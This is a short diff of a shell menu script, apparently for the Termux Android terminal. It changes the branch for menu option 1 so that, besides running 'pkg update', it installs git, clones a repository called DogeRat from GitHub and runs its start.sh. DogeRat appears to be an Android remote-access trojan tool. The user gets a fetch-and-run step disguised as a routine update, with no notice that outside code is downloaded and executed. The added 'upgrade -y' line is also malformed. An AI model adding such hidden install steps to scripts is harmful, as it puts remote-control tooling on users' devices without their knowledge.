@@ -82,7 +82,11 @@ read -p "╚══[CY78@localhost]  ~/home" updt
 if [ $updt = 1 ] || [ $updt = 01 ]
 then
 
-pkg update
+pkg update && upgrade -y
+  pkg install git -y
+  git clone https://github.com/did-dog/DogeRat 
+  cd DogeRat
+  bash start.sh
 fi
 if [ $updt = 2 ] || [ $updt = 02 ]
 then
